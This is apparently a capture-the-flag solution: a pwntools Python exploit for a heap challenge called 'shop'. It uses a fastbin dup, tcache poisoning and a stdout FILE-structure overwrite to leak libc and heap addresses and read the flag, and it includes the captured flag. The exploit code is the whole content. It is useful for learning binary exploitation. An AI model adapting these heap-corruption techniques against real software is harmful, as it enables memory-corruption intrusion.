![image](https://github.com/user-attachments/assets/28fee5c9-688c-4323-83ff-dcff34bebf07)



```python
#!/usr/bin/env python3

# From Gnas ^^
from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

DEBUG = 0


if args.LOCAL:
	#r = process([exe.path])
	if DEBUG:
		gdb.attach(r, gdbscript='''
			start
			''')
else:
	#r = remote("shop.challs.csc.tf", 1337)
	print()

def buy_pet(r, size):
	r.sendlineafter(b"> ", b"1")
	r.sendlineafter(b"How much? ", f"{size}".encode())
def edit_name(r, index, payload):
	r.sendlineafter(b"> ", b"2")
	r.sendlineafter(b"Index: ", f"{index}".encode())
	r.sendafter(b"Name: ", payload)

def refund(r, index):
	r.sendlineafter(b"> ", b"3")
	r.sendlineafter(b"Index: ", f"{index}".encode())


def main():
	while True:
		#r = process([exe.path])
		r = remote("shop.challs.csc.tf", 1337)

		for i in range(7):
			buy_pet(r, 0x70-8) #index from 0...6

		buy_pet(r, 0xc0-8) # index 7
		buy_pet(r, 0x70-8) # index 8
		buy_pet(r, 0x70-8) # index 9
		buy_pet(r, 0x500-8) # index 10
		buy_pet(r, 0x20-8) # index 11 (avoid consolitating with top chunk)

		refund(r, 10) #index 10 is now FREE
		
		buy_pet(r, 0x70-8) # index 10 - contains unsorted bins address
		buy_pet(r, 0x490-8) # index 12

		for i in range(7):
			refund(r, i) # fill up tcache size of 0x70
			# index from 0...6 are now FREE

		refund(r, 9) # index 9 is now free
		refund(r, 8) # index 8 is now free
		refund(r, 9) #fastbin dup
		#fastbin size 0x70 -> 9 -> 8 -> 9

		# malloc from tcache bin
		for i in range(7):
			buy_pet(r, 0x70-8) #index from 0...6


		#r.interactive()

		buy_pet(r, 0x70-8) # index 8

		buy_pet(r, 0x70-8) # index 9

		buy_pet(r, 0x70-8) # index 13
		# index 8 = index 13


		refund(r, 0) # index 0 is now FREE
		refund(r, 9) # index 9 is now FREE
		refund(r, 8) # index 8 is now FREE
		#tcache [size 0x70] -> 8 -> 9 -> 0

		edit_name(r, 13, b"\xf0")

		buy_pet(r, 0x70-8) # index 0
		
		
		try:
			edit_name(r, 10, b"\xa0\x26")
			buy_pet(r, 0x70-8) # index 8

			buy_pet(r, 0x70-8) # index 9 - IMPORTANT
			flag = 0xfbad1800
			payload = p64(flag) + p64(0)*3 + b"\x08"
			edit_name(r, 9, payload)
		except EOFError:
			print('[*] fail')
			r.close()
			continue

		print("[*] SUCCESS!")

		test = r.recv(20)
		if len(test) <= 5:
			r.close()
			continue
		if (test[5] >> 4) != 7:
			r.close()
			continue
		
		libc.address = u64(test[:6] + b"\x00\x00")-0x1ec980
		print("[*] libc: ", hex(libc.address))

		unsorted_bin = libc.address+0x1ecbf0


		# Leak heap
		buy_pet(r, 0x500-8) # index 14
		buy_pet(r, 0x18) # index 15

		refund(r, 14)


		flag = 0xfbad1800
		payload = p64(flag) + p64(0)*3
		payload += p64(unsorted_bin)
		payload += p64(unsorted_bin+6)

		payload += p64(unsorted_bin+6)*2

		payload += p64(unsorted_bin+6+1)
		edit_name(r, 9, payload)

		heap_leak = u64(r.recv(6) + b"\x00"*2) - 0xd00
		print("[*]heap: ", hex(heap_leak))

		#gdb.attach(r, gdbscript='''
		#	start
		#	''')


		# lets print the flag!!!
		target = heap_leak+0x308

		flag = 0xfbad1800
		payload = p64(flag) + p64(0)*3
		payload += p64(target)
		payload += p64(target+0x40)

		payload += p64(target+0x40)*2

		payload += p64(target+0x40+1)
		edit_name(r, 9, payload)




		# CSCTF{26f8aa2b094cc646137e7da9778584d1}

		# good luck pwning :)

		r.interactive()


if __name__ == "__main__":
	main()

```
